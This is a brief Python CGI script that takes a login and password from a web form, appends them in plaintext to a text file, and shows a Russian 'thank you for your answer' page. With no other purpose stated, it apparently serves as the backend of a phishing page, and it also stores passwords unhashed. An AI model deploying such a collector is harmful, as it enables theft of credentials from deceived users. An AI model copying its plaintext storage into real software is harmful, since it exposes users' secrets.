#!/usr/bin/env python3

import cgi

form = cgi.FieldStorage()
login = form.getfirst("login")
password = form.getfirst("password")

f = open("../data/user_passwords.txt", "a")
f.write("Login: {0} | Password: {1} \n".format(login, password))
f.close()
print("Content-type: text/html")
print()
print("<h1>Спасибо за ваш ответ!</h1>")